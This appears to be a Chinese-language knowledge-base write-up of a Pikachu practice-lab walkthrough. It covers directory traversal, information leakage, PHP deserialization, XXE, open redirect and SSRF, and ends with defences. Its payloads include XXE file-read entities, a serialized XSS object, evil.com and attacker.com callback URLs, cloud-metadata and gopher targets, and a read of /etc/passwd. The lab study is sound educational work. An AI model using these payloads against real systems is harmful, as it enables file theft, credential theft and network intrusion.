---
title: Pikachu靶场实战系列第五篇：目录遍历、信息泄露、PHP反序列化、XXE、不安全重定向、SSRF六大漏洞完整复现与利用链分析
description: 基于无名安全团队归档文章，系统复现 Pikachu 靶场第 5 篇实战内容，涵盖目录遍历、敏感信息泄露、PHP 反序列化、XXE 外部实体注入、不安全
  URL 跳转、SSRF 服务端请求伪造六大漏洞的原理、Payload 构造、利用链分析及防御思路，交叉引用现有知识库相关技术详解页面。
category: program-analysis
tags:
- Pikachu靶场
- 目录遍历
- 信息泄露
- PHP反序列化
- XXE
- 不安全重定向
- SSRF
- 漏洞复现
- 利用链分析
- 无名安全团队
date: 2025-08-15
updated: '2026-11-14'
---
## 概述

本页面整理自无名安全团队微信归档文章《pikachu靶场&目录遍历&信息泄露&反序列化&XXE&重定向&SSRF(五)》，系统复现 Pikachu 靶场第 5 篇实战内容。文章覆盖 **目录遍历**、**敏感信息泄露**、**PHP 反序列化**、**XXE (XML External Entity Injection)**、**不安全 URL 跳转**、**SSRF (Server-Side Request Forgery)** 六大漏洞类型，从原理讲解、源码审计、Payload 构造到实战复现形成完整攻击链分析。

> 原文链接：http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247486443&idx=5&sn=e7d24e42ee833787b1bcf8f3561ce73d
> 作者：无名安全团队成员 - Geek_韧

---

## 目录遍历

### 漏洞原理

在 Web 功能设计中，常将需访问的文件定义为变量以提升灵活性。前端请求时将文件名等值传递给后台，后台执行对应文件操作。**若后台未对前端传入值进行严格安全校验**，攻击者可利用 `../` 等路径遍历序列，让后台读取/执行服务器上其他目录文件，导致目录遍历漏洞。

> **区分要点**：
> - **目录遍历**：通过带参数的 URL（如 `?file=../../etc/passwd`）跨目录读取文件
> - **敏感信息泄露**：直接访问不带参数的 URL（如 `http://xxxx/doc`）列出目录文件列表

### 实战复现

靶场演示了三个典型场景截图（原文图片已省略），展示如何通过操纵文件名参数实现跨目录文件读取。

### 交叉引用

- [[ssrf-ctf-exploitation-guide]] —— SSRF 场景下常结合 `file://` 协议实现本地文件读取，与目录遍历利用思路相通
- [[vulnhub-infosecprep-oscp-writeup]] —— VulnHub 靶机实战中通过目录遍历获取 Base64 编码 SSH 私钥

---

## 信息泄露

### 漏洞定义

由于后台人员疏忽或不当设计，导致不应被前端用户看到的数据被轻易访问。常见形态：

1. **目录列表泄露**：直接访问 URL 目录列出文件列表
2. **报错信息泄露**：错误参数触发报错，泄露操作系统、中间件、开发语言版本等
3. **前端源码泄露**：HTML/CSS/JS 中硬编码后台登录地址、内网接口、甚至账号密码

> 虽然常被评为低危，但敏感信息往往为后续攻击提供关键线索，甚至直接造成严重损失。

### 实战复现

1. **查看网页源码发现账户密码** —— 前端硬编码凭证
2. **登陆后发现功能在 `abc.php`** —— 认证后才能访问的页面
3. **未登录直接访问 `abc.php` 成功** —— 缺乏鉴权控制，越权访问敏感功能

### 交叉引用

- [[ctfshow-web-info-gathering-brute-force]] —— CTFshow 信息收集关卡系统梳理源码泄露、版本控制残留、编辑器缓存、Cookie/域名/邮箱信息利用等技巧
- [[attack-defense-world-master-advanced-writeup]] —— 攻防世界靶场中 Git 源码泄露、phpinfo 探针等信息收集实战

---

## PHP 反序列化

### 核心概念

| 概念 | 说明 |
|------|------|
| **序列化** | 将对象转换为可存储/可传输的字符串（字节序列），用于永久保存、网络传输、进程间通信 |
| **反序列化** | 将序列化字符串还原为可用对象 |
| **魔术方法** | PHP 中以 `__` 开头，因特定条件自动触发，无需手动调用。反序列化漏洞核心利用点 |

### 关键魔术方法

```php
__construct()   // 对象创建时调用
__destruct()    // 对象销毁时调用
__wakeup()      // 反序列化时调用
__sleep()       // 序列化时调用
__call()        // 调用不可访问方法时触发
__get()/__set() // 访问不可访问属性时触发
__toString()    // 对象被当作字符串使用时触发
```

> **漏洞成因**：服务端接收用户可控的反序列化字符串，且未经过滤直接放入魔术方法中执行。

### 实战复现流程

1. **随机提交数据观测反馈** —— 仅为 POST 提交表单，无明显报错
2. **源码审计发现反序列化逻辑**：
   ```php
   if(isset($_POST['o'])) {
       $s = $_POST['o'];
       if(!@$unser = unserialize($s)) {
           echo "<p>大兄弟,来点劲爆点儿的!</p>";
       } else {
           echo "<p>{$unser->test}</p>";
       }
   }
   ```
3. **构造序列化 Payload**：
   ```
   O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
   ```
   - `O:1:"S"`：类名 S，长度 1
   - `1:{...}`：1 个属性
   - `s:4:"test"`：属性名 test，长度 4
   - `s:29:"..."`：属性值长度 29
4. **提交反序列化字符串** —— 成功输出 `test` 属性值，验证反序列化执行

### 交叉引用

- [[php伪协议与反序列化利用]] —— 深度解析 `__wakeup` 绕过（对象计数不匹配）、正则过滤数字绕过（+ 前缀）、base64 编码差异利用细节，结合赣网杯2020、攻防世界 unserialize3 实战
- [[attack-defense-world-master-advanced-writeup]] —— 攻防世界高手进阶区 PHP 反序列化题目完整解题报告
- [[php-webshell-fundamentals-chopper-analysis]] —— PHP 一句话木马基于 `eval()` 执行原理，蚁剑连接流程与数据包解析

---

## XXE (XML External Entity Injection)

### 漏洞原理

**XML 外部实体注入**：服务端接收并解析用户提交的 XML 数据，未做严格安全控制，导致攻击者注入指定 XML 实体内容，服务器按配置执行，造成任意文件读取、SSRF、RCE 等后果。

> 现代语言 XML 解析库默认多禁止外部实体解析（如 PHP libxml ≥ 2.9.0 默认关闭）。

### XML 结构与 DTD 基础

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY entity-name SYSTEM "URI/URL">
]>
<note>
  <to>Dave</to>
  <from>Tom</from>
  <head>Reminder</head>
  <body>You are a good man</body>
</note>
```

- **DTD (Document Type Definition)**：定义 XML 语法约束，可内部声明或引用外部
- **实体引用**：`&entity-name;` 调用实体
- **外部实体**：`SYSTEM` (本地) / `PUBLIC` (公共)，支持 `file://`、`http://`、`php://filter/` 等协议

### 常用协议与 Payload

| 协议 | 用途 | 示例 |
|------|------|------|
| `file://` | 本地文件读取 | `file:///E://1.txt` |
| `php://filter/` | 编码转换读取源码 | `php://filter/read=convert.base64-encode/resource=conf.php` |
| `http://` | 发起外部请求 | `http://attacker.com/evil.dtd` |

### 实战复现

1. **源码审计**：发现使用 `simplexml_load_string()` 接收输入，源码给出两个示例 Payload
2. **基础实体回显测试**：
   ```xml
   <?xml version = "1.0"?>
   <!DOCTYPE note [ <!ENTITY hacker "ESHLkangi"> ]>
   <name>&hacker;</name>
   ```
   成功回显 `ESHLkangi`
3. **任意文件读取**（两种 Payload 均可）：
   ```xml
   <!-- 直接读取 -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE name [ <!ENTITY xxe SYSTEM "file:///E://1.txt"> ]>
   <name>&xxe;</name>

   <!-- 编码读取 -->
   <?xml version = "1.0"?>
   <!DOCTYPE ANY [ <!ENTITY f SYSTEM "php://filter/read=utf-8/resource=E://1.txt"> ]>
   <x>&f;</x>
   ```

### 交叉引用

- [[xxe-xml-dtd-fundamentals]] —— 系统梳理 XXE 核心基础：XML 语法树、DTD 声明类型、实体引用分类、PCDATA 与 CDATA 差异、外部实体通过 file/http 协议实现任意文件读取原理
- [[php伪协议与反序列化利用]] —— `php://filter` 伪协议在 XXE 与 SSRF 中的综合利用技巧
- [[ssrf-ctf-exploitation-guide]] —— CTFHUB 靶场 SSRF 关卡中 XXE 结合 Gopher/FastCGI/Redis 多协议利用链

---

## 不安全的 URL 跳转

### 漏洞原理

发生在一切执行 URL 跳转的地方。后端采用前端可控参数（用户传参或前端预埋 URL）作为跳转目标，未做判断校验，导致“跳错对象”。

### 直接危害：钓鱼攻击

攻击者利用受信域名（知名公司域名）掩盖，诱导用户点击，最终跳转至钓鱼网站，窃取凭证或分发恶意代码。

### 实战复现

1. **查看网页源代码** —— 发现跳转逻辑直接使用前端传入的 `url` 参数
2. **构造恶意跳转链接** —— `?url=http://evil.com/phishing` 实现钓鱼跳转

### 防御建议

- 维护跳转白名单，仅允许跳转至受信域名
- 跳转前提示用户确认目标域名
- 使用相对路径或内部路由标识，避免直接拼接用户输入

---

## SSRF (Server-Side Request Forgery)

### 漏洞原理

服务端提供从其他服务器获取数据的功能，但未对目标地址做严格过滤与限制，攻击者可传入任意地址让后端服务器发起请求并返回数据。

**数据流向**：攻击者 → 服务器 → 目标地址（内网/本地/外网）

### 危险函数 (PHP)

| 函数 | 特性 |
|------|------|
| `file_get_contents()` | 支持 `file://`、`http://`、`ftp://`、`php://` 等协议，可读取本地文件、发起 HTTP 请求 |
| `curl_exec()` | 支持更多协议（`dict://`、`gopher://`、`ldap://` 等），功能更强大，利用面更广 |
| `fsockopen()` | 底层 Socket 操作，可构造任意 TCP 请求 |

> 若业务必须远程获取用户指定资源，**务必做好目标地址过滤**（白名单、协议限制、内网 IP 禁止等）。

### 实战复现：cURL 场景

1. **源码使用 `curl_exec()` 获取用户指定 URL 内容**
2. **提交外部可控服务器地址**（如 `http://attacker.com/log`）验证回连
3. **攻击面拓展**：
   - **内网探测**：扫描内网存活主机、开放端口、服务指纹
   - **云元数据服务攻击**：`http://169.254.169.254/latest/meta-data/` (AWS) 等
   - **协议利用**：`file://` 读文件、`gopher://` 攻击 Redis/FastCGI、`dict://` 探测端口

### 实战复现：file_get_contents 场景

1. **源码使用 `file_get_contents($_GET['url'])`**
2. **修改链接读取任意内容**：
   - `file:///etc/passwd` 读取本地敏感文件
   - `php://filter/read=convert.base64-encode/resource=index.php` 读取源码
   - `http://internal-service/admin` 访问内网管理接口

### 交叉引用

- [[ssrf-bypass-techniques]] —— 系统梳理 SSRF 五大核心绕过技巧：用户信息绕过、十六进制 IP 绕过、302 跳转绕过、DNS 重绑定绕过、localhost 绕过，附原理分析、Payload 构造及多协议利用链
- [[ssrf-ctf-exploitation-guide]] —— CTFHUB 靶场 SSRF 关卡完整利用链：内网探测、file/gopher/fastcgi/redis 多协议利用、POST 请求构造、文件上传 Getshell、FastCGI 与 Redis RCE 实战、双重 URL 编码技巧
- [[php伪协议与反序列化利用]] —— SSRF 场景下 `gopher://` 发送原始 TCP 数据包攻击 FastCGI/Redis、双重 URL 编码绕过解析机制
- [[gkctf-2021-web-writeup]] —— GKCTF 2021 CheckBot 题目 SSRF/XSS 组合窃取 Flag 实战
- [[internal-network-pivoting-techniques]] —— SSRF 作为内网穿透/横向移动的切入点，结合 frp、Venom、Cobalt Strike SMB Beacon 等工具建立代理通道

---

## 综合利用链与防御总结

### 漏洞关联性分析

| 漏洞类型 | 核心成因 | 典型利用链延伸 |
|----------|----------|----------------|
| 目录遍历 | 文件路径参数未校验 | 读取配置文件 → 获取数据库凭证/密钥 → 进一步渗透 |
| 信息泄露 | 错误处理不当/源码硬编码 | 泄露版本/路径/凭证 → 定向攻击/凭证填充 |
| PHP 反序列化 | 用户可控数据进入 `unserialize()` + 魔术方法 | POP 链构造 → 任意文件读写/RCE → 服务器沦陷 |
| XXE | XML 解析器开启外部实体 | 任意文件读取/SSRF/DoS → 内网探测/RCE |
| 不安全跳转 | 跳转目标参数未校验 | 钓鱼/水坑攻击 → 凭证窃取/恶意软件分发 |
| SSRF | 服务端请求目标可控 | 内网扫描/云元数据窃取/协议攻击 (Redis/FastCGI/RMI) → 横向移动 |

### 统一防御原则

1. **输入验证与过滤**：所有用户可控输入（参数、Header、Body、文件上传）均需严格校验，采用白名单策略
2. **最小权限原则**：服务端进程、数据库账号、文件系统权限最小化
3. **安全配置硬化**：
   - 关闭目录浏览
   - 关闭详细错误回显（生产环境）
   - XML 解析器禁用外部实体 (`libxml_disable_entity_loader(true)`)
   - 反序列化避免 `unserialize()` 用户可控数据，改用 JSON 等安全格式
   - SSRF 防护：禁止内网 IP、限制协议、请求超时、统一出口代理
4. **监控与审计**：WAF 规则覆盖上述漏洞特征，日志审计异常请求模式

---

## 相关知识库页面索引

| 页面 | 关联漏洞/技术点 |
|------|-----------------|
| [[php伪协议与反序列化利用]] | PHP 反序列化、XXE、SSRF 中的伪协议综合利用 |
| [[xxe-xml-dtd-fundamentals]] | XXE 核心基础原理与实体引用分类 |
| [[ssrf-bypass-techniques]] | SSRF 五大绕过技巧与多协议利用链 |
| [[ssrf-ctf-exploitation-guide]] | CTFHUB 靶场 SSRF 完整实战利用链 |
| [[attack-defense-world-master-advanced-writeup]] | 攻防世界 PHP 反序列化、文件包含、Git 泄露等实战 |
| [[ctfshow-web-info-gathering-brute-force]] | 信息收集与爆破类技巧系统梳理 |
| [[vulnhub-infosecprep-oscp-writeup]] | 目录遍历获取 SSH 私钥实战 |
| [[gkctf-2021-web-writeup]] | SSRF/XSS 组合、Java 反序列化、Node.js 原型链污染 |
| [[internal-network-pivoting-techniques]] | SSRF 为入口的内网穿透与横向移动技术体系 |

---

## 结语

> 整体走下来，爆破、XSS、CSRF、SQL注入、远程代码&命令执行、文件包含、文件上传、文件下载、越权、目录扫描、信息泄露、反序列化、XXE、重定向、SSRF，这些漏洞似乎都有对用户输入处理不充分的原因，还有一些涉及可执行的危险函数或协议，只要有用户可以操作的空间就可能存在漏洞。
>
> 网络安全是一条漫长的路，只有不断的学习才能守护我们的网络空间，即使路途艰辛，但边走边欣赏沿途风景，这样也不错。

—— 无名安全团队 Geek_韧

## 来源

- [0x00实验室-202108-202304_075](../sources/0x00实验室-202108-202304_075.md)
